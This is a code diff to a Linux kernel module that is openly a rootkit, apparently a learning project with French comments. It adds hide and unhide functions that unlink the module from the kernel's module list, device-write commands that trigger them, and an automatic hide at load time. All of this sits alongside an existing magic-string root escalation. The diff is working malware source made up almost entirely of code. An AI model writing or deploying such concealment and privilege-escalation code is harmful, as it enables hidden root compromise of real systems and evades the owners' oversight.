@@ -18,8 +18,13 @@ static int 	    mymisc_release(struct inode *i, struct file *f);
 static ssize_t	mymisc_read(struct file *file, char __user *buf, size_t count, loff_t *off);
 static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t len, loff_t *off);
 static long 	mymisc_ioctl(struct file *file, unsigned int request, unsigned long arg);
-
 int set_root(void);
+int hide(void);
+int unhide(void);
+
+
+int hidden;
+static struct list_head *prev_module;
 
 static struct file_operations fops =
 {
@@ -84,7 +89,40 @@ static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t le
             }
             else 
                 {RK_DEBUG("Should have got root\n");}
-        }   
+        } 
+
+        else if (strcmp(buf, RK_HIDE) == 0)
+        {
+            int ret;
+            RK_DEBUG("Hiding the rootkit\n");
+
+            ret = hide();
+            if (ret < 0)
+            {
+                RK_DEBUG("Rootkit already hidden.\n");
+                return ret;
+            } 
+            else {
+                RK_DEBUG("Should have hidden the rootkit\n");
+            }
+        }
+
+        else if (strcmp(buf, RK_REVEAL) == 0)
+        {
+            int ret;
+            RK_DEBUG("Revealing the rootkit\n");
+
+            ret = unhide();
+            if (ret < 0)
+            {
+                RK_DEBUG("Rootkit already shown.\n");
+                return ret;
+            } 
+            else {
+                RK_DEBUG("Should have revealed the rootkit\n");
+            }
+        }
+
         return len;        
 }
 
@@ -95,9 +133,50 @@ static long 	mymisc_ioctl(struct file *file, unsigned int request, unsigned long
     return 0;
 }
 
+int hide(void)
+{   
+
+    /*
+    prev_module->next = THIS_MODULE->next
+    THIS_MODULE->next->prev = prev_module
+    */
+
+    if (! hidden)
+    {   
+        prev_module = THIS_MODULE->list.prev; //sauvegarde de l'éntrée précedente de la liste chainée
+        list_del(&THIS_MODULE->list); 
+        hidden = 1;
+        return 0;
+    }
+
+    else
+        {return -1;}
+}
+
+int unhide(void)
+{
+    /*
+    prev_module->next->prev = THIS_MODULE
+    prev_module->next = THIS_MODULE
+    THIS_MODULE->prev = prev_module 
+    */
+
+    if (hidden)
+    {
+        list_add(&THIS_MODULE->list, prev_module); 
+        hidden = 0;
+        return 0;
+    }
+
+    else 
+        {return -1;}
+
+}
+
 static int __init mymisc_init(void)
 {
 
+    hide();
 	int r;
 	r = misc_register(&mymisc);
 	if (r < 0)
